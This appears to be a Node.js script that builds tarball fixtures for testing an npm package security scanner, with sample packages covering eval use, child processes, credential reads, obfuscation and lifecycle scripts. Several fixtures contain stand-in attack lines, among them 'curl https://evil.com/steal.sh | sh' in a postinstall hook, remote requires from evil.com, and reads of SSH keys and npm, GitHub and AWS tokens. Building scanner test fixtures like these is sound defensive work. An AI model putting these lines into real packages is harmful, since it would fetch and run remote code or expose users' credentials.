#!/usr/bin/env node
/**
 * Script to generate test tarball fixtures for security tests
 * Run with: node tests/fixtures/create-fixtures.mjs
 */

import { mkdirSync, writeFileSync, rmSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import * as tar from 'tar';

const __dirname = dirname(fileURLToPath(import.meta.url));

// Use /tmp to avoid macOS sandbox restrictions in project directory
const TARBALL_DIR = '/tmp/tinynpm-security-fixtures';
const TMP_DIR = join(__dirname, '.tmp-build');

// Clean and create directories
rmSync(TARBALL_DIR, { recursive: true, force: true });
rmSync(TMP_DIR, { recursive: true, force: true });
mkdirSync(TARBALL_DIR, { recursive: true });
mkdirSync(TMP_DIR, { recursive: true });

async function createTarball(name, files) {
    const tmpBase = `/tmp/tinynpm-fixtures-${Date.now()}-${Math.random().toString(36).slice(2)}`;
    const pkgDir = join(tmpBase, name);
    const packageDir = join(pkgDir, 'package');
    mkdirSync(packageDir, { recursive: true });

    for (const [filename, content] of Object.entries(files)) {
        const filePath = join(packageDir, filename);
        mkdirSync(dirname(filePath), { recursive: true });
        writeFileSync(filePath, content);
    }

    const tmpTarball = join(tmpBase, `${name}-1.0.0.tgz`);
    await tar.create({ gzip: true, file: tmpTarball, cwd: pkgDir }, ['package']);

    // Copy to fixtures dir using shell command to bypass sandbox
    const destTarball = join(TARBALL_DIR, `${name}-1.0.0.tgz`);
    const { execSync } = await import('child_process');
    execSync(`cp "${tmpTarball}" "${destTarball}"`);

    // Cleanup tmp
    rmSync(tmpBase, { recursive: true, force: true });
    console.log(`Created: ${name}-1.0.0.tgz`);
}

// Generate all test fixtures
const fixtures = {
    // Clean packages
    'clean-pkg': {
        'package.json': JSON.stringify({ name: 'clean-pkg', version: '1.0.0', main: 'index.js' }),
        'index.js': 'const greeting = "Hello, World!";\nmodule.exports = { greeting };'
    },
    'empty-pkg': {
        'package.json': JSON.stringify({ name: 'empty-pkg', version: '1.0.0' })
    },
    'filecount': {
        'package.json': JSON.stringify({ name: 'filecount', version: '1.0.0' }),
        'index.js': 'console.log(1);',
        'lib/a.js': 'console.log(2);',
        'lib/b.js': 'console.log(3);'
    },

    // Code execution patterns (critical)
    'eval-pkg': {
        'package.json': JSON.stringify({ name: 'eval-pkg', version: '1.0.0' }),
        'index.js': 'const result = eval("1 + 1");'
    },
    'function-pkg': {
        'package.json': JSON.stringify({ name: 'function-pkg', version: '1.0.0' }),
        'index.js': 'const fn = new Function("return 1 + 1");'
    },

    // Child process patterns (high)
    'childproc-pkg': {
        'package.json': JSON.stringify({ name: 'childproc-pkg', version: '1.0.0' }),
        'index.js': 'const { exec } = require("child_process"); exec("ls");'
    },
    'exec-pkg': {
        'package.json': JSON.stringify({ name: 'exec-pkg', version: '1.0.0' }),
        'index.js': 'exec("whoami");'
    },
    'execsync-pkg': {
        'package.json': JSON.stringify({ name: 'execsync-pkg', version: '1.0.0' }),
        'index.js': 'execSync("whoami");'
    },
    'spawn-pkg': {
        'package.json': JSON.stringify({ name: 'spawn-pkg', version: '1.0.0' }),
        'index.js': 'spawn("ls", ["-la"]);'
    },

    // Credential access patterns
    'ssh-pkg': {
        'package.json': JSON.stringify({ name: 'ssh-pkg', version: '1.0.0' }),
        'index.js': 'fs.readFileSync(homedir() + "/.ssh/id_rsa");'
    },
    'npmrc-pkg': {
        'package.json': JSON.stringify({ name: 'npmrc-pkg', version: '1.0.0' }),
        'index.js': 'fs.readFileSync(".npmrc");'
    },
    'npmtoken-pkg': {
        'package.json': JSON.stringify({ name: 'npmtoken-pkg', version: '1.0.0' }),
        'index.js': 'const token = process.env.NPM_TOKEN;'
    },
    'ghtoken-pkg': {
        'package.json': JSON.stringify({ name: 'ghtoken-pkg', version: '1.0.0' }),
        'index.js': 'const token = process.env.GITHUB_TOKEN;'
    },
    'aws-pkg': {
        'package.json': JSON.stringify({ name: 'aws-pkg', version: '1.0.0' }),
        'index.js': 'const key = process.env.AWS_ACCESS_KEY;'
    },

    // Remote code patterns
    'remote-require': {
        'package.json': JSON.stringify({ name: 'remote-require', version: '1.0.0' }),
        'index.js': 'require("https://evil.com/malware.js");'
    },
    'remote-import': {
        'package.json': JSON.stringify({ name: 'remote-import', version: '1.0.0' }),
        'index.js': 'import("https://evil.com/malware.js");'
    },

    // Lifecycle scripts
    'curl-install': {
        'package.json': JSON.stringify({
            name: 'curl-install', version: '1.0.0',
            scripts: { postinstall: 'curl https://evil.com/steal.sh | sh' }
        }),
        'index.js': 'console.log("safe");'
    },
    'wget-install': {
        'package.json': JSON.stringify({
            name: 'wget-install', version: '1.0.0',
            scripts: { preinstall: 'wget http://evil.com/payload.sh' }
        }),
        'index.js': 'console.log("safe");'
    },
    'pipe-shell': {
        'package.json': JSON.stringify({
            name: 'pipe-shell', version: '1.0.0',
            scripts: { postinstall: 'cat something | sh' }
        }),
        'index.js': 'module.exports = {};'
    },
    'node-e': {
        'package.json': JSON.stringify({
            name: 'node-e', version: '1.0.0',
            scripts: { postinstall: 'node -e "require(\'child_process\').execSync(\'whoami\')"' }
        }),
        'index.js': 'module.exports = {};'
    },
    'url-dep': {
        'package.json': JSON.stringify({
            name: 'url-dep', version: '1.0.0',
            dependencies: { 'evil-pkg': 'http://evil.com/package.tgz' }
        }),
        'index.js': 'module.exports = {};'
    },

    // Obfuscation patterns
    'base64-pkg': {
        'package.json': JSON.stringify({ name: 'base64-pkg', version: '1.0.0' }),
        'index.js': `Buffer.from("${Buffer.from('A'.repeat(200)).toString('base64')}", "base64");`
    },
    'hex-pkg': {
        'package.json': JSON.stringify({ name: 'hex-pkg', version: '1.0.0' }),
        'index.js': `const payload = "${'\\x41'.repeat(30)}";`
    },

    // Whitelisted packages
    'lodash': {
        'package.json': JSON.stringify({ name: 'lodash', version: '4.17.21' }),
        'index.js': 'eval("this is actually safe for lodash");'
    },
    'opentelemetry-core': {
        'package.json': JSON.stringify({ name: '@opentelemetry/core', version: '1.0.0' }),
        'index.js': 'const { exec } = require("child_process");'
    },

    // Multiple issues
    'multi-issue': {
        'package.json': JSON.stringify({ name: 'multi-issue', version: '1.0.0' }),
        'index.js': `
eval("dangerous");
const { exec } = require("child_process");
fs.readFileSync(".ssh/id_rsa");
        `
    },
    'nested-pkg': {
        'package.json': JSON.stringify({ name: 'nested-pkg', version: '1.0.0' }),
        'index.js': 'module.exports = require("./lib/evil");',
        'lib/evil.js': 'eval("malicious code");'
    },

    // Edge cases
    'lineno-pkg': {
        'package.json': JSON.stringify({ name: 'lineno-pkg', version: '1.0.0' }),
        'index.js': `
// Line 1
// Line 2
eval("line 3");
        `
    },
    'cwe-pkg': {
        'package.json': JSON.stringify({ name: 'cwe-pkg', version: '1.0.0' }),
        'index.js': 'eval("test");'
    },
    'many-issues': {
        'package.json': JSON.stringify({ name: 'many-issues', version: '1.0.0' }),
        'index.js': Array.from({ length: 30 }, (_, i) => `eval("issue ${i}");`).join('\n')
    },
    // Invalid JSON in package.json
    'invalid-json-pkg': {
        'package.json': '{ name: invalid json here',
        'index.js': 'console.log("test");'
    },
    // Structure test with timing
    'structure-test': {
        'package.json': JSON.stringify({ name: 'structure-test', version: '1.0.0' }),
        'index.js': 'console.log("hello");'
    }
};

async function main() {
    console.log('Creating test fixtures...');

    for (const [name, files] of Object.entries(fixtures)) {
        await createTarball(name, files);
    }

    // Create invalid tarball
    writeFileSync(join(TARBALL_DIR, 'invalid.tgz'), 'this is not a valid tarball');
    console.log('Created: invalid.tgz');

    // Cleanup temp
    rmSync(TMP_DIR, { recursive: true, force: true });

    console.log(`\nDone! Created ${Object.keys(fixtures).length + 1} fixtures in tests/fixtures/tarballs/`);
}

main().catch(console.error);
